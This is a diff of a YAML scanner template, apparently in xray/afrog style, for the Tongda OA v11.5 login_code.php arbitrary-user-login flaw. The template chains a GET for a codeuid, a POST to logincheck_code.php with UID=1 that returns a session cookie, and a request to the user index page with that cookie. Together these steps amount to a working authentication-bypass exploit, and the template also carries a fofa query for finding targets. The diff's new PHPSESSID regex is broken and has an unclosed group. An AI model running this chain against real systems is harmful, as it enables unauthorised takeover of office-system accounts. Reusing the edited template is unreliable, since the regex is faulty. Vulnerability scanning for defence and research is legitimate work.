@@ -1,47 +1,51 @@
+expression: r0() && r1() && r2()
 id: tongda-oa-logincode-any-user-login
-
 info:
-  name: 通达OA v11.5 login_code.php 任意用户登录
   author: daffainfo
+  description: "\u901A\u8FBEOA\u662F\u4E00\u5957\u529E\u516C\u7CFB\u7EDF\u30022020\u5E74\
+    04\u670817\u65E5, \u901A\u8FBEOA\u5B98\u65B9\u5728\u66F4\u65B0\u4E86\u4E00\u4E2A\
+    v11\u7248\u672C\u5B89\u5168\u8865\u4E01, \u5176\u4E2D\u4FEE\u590D\u4E86\u4E00\u4E2A\
+    \u4EFB\u610F\u7528\u6237\u4F2A\u9020\u767B\u5F55\u6F0F\u6D1E\u3002 \u8BE5\u6F0F\
+    \u6D1E\u7C7B\u578B\u4E3A\u4EFB\u610F\u7528\u6237\u4F2A\u9020\uFF0C\u672A\u7ECF\
+    \u6388\u6743\u7684\u8FDC\u7A0B\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u7CBE\
+    \u5FC3\u6784\u9020\u7684\u8BF7\u6C42\u5305\u8FDB\u884C\u4EFB\u610F\u7528\u6237\
+    \u4F2A\u9020\u767B\u5F55\u3002\n\u5F71\u54CD\u7248\u672C\n\u901A\u8FBEOA 2017\u7248\
+    \n\u901A\u8FBEOA\u7248\u672C V11.X < V11.5\nfofa-query: app=\"TDXK-\u901A\u8FBE\
+    OA\"\n"
+  name: "\u901A\u8FBEOA v11.5 login_code.php \u4EFB\u610F\u7528\u6237\u767B\u5F55"
+  reference:
+  - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.5%20login_code.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95.html
+  - https://mp.weixin.qq.com/s/P-LC0fosKu0k7pCiBvQXPw
+  - https://www.ngui.cc/el/1349776.html?action=onClick
   severity: critical
   verified: true
-  description: |
-    通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。 该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。
-    影响版本
-    通达OA 2017版
-    通达OA版本 V11.X < V11.5
-    fofa: app="TDXK-通达OA"
-  reference:
-    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.5%20login_code.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95.html
-    - https://mp.weixin.qq.com/s/P-LC0fosKu0k7pCiBvQXPw
-    - https://www.ngui.cc/el/1349776.html?action=onClick
-  tags: tongda,oa,logincode,any,user,login
-  created: 2025/03/13
-
 rules:
   r0:
+    expression: response.status == 200 && response.body.bcontains(b'"codeuid":') &&
+      response.body.bcontains(b'"authcode":') && response.headers["content-type"].contains("text/html")
+    output:
+      codeuid: search2["codeuid"]
+      search2: '"\"codeuid\":\"(?P<codeuid>.*?)\"".bsubmatch(response.body)'
     request:
       method: GET
       path: /ispirit/login_code.php
-    expression: response.status == 200 && response.body.bcontains(b'"codeuid":') && response.body.bcontains(b'"authcode":') && response.headers["content-type"].contains("text/html")
-    output:
-      search2: '"\"codeuid\":\"(?P<codeuid>.*?)\"".bsubmatch(response.body)'
-      codeuid: search2["codeuid"]
   r1:
-    request:
-      method: POST
-      path: /logincheck_code.php
-      body: |
-        CODEUID=_PC{{codeuid}}&UID=1
     expression: response.status == 200 && response.body.bcontains(b'"status":1')
     output:
-      search: '"Set-Cookie: PHPSESSID=(?P<phpsessid>.*?)\n".bsubmatch(response.raw_header)'
       phpsessid: search["phpsessid"]
-  r2:
+      search: '"Set-Cookie: PHPSESSID=(?P<phpsessid>.*?\n".bsubmatch(response.raw_header)'
     request:
-      method: GET
-      path: /general/index.php?isIE=0&modify_pwd=0
+      body: 'CODEUID=_PC{{codeuid}}&UID=1
+
+        '
+      method: POST
+      path: /logincheck_code.php
+  r2:
+    expression: response.status == 200 && response.body.bcontains(b'loginUser') &&
+      response.body.bcontains(b'uid:') && response.body.bcontains(b'user_id:') &&
+      response.body.bcontains(b'user_name:')
+    request:
       headers:
         Cookie: PHPSESSID={{phpsessid}}
-    expression: response.status == 200 && response.body.bcontains(b'loginUser') && response.body.bcontains(b'uid:') && response.body.bcontains(b'user_id:') && response.body.bcontains(b'user_name:')
-expression: r0() && r1() && r2()
+      method: GET
+      path: /general/index.php?isIE=0&modify_pwd=0
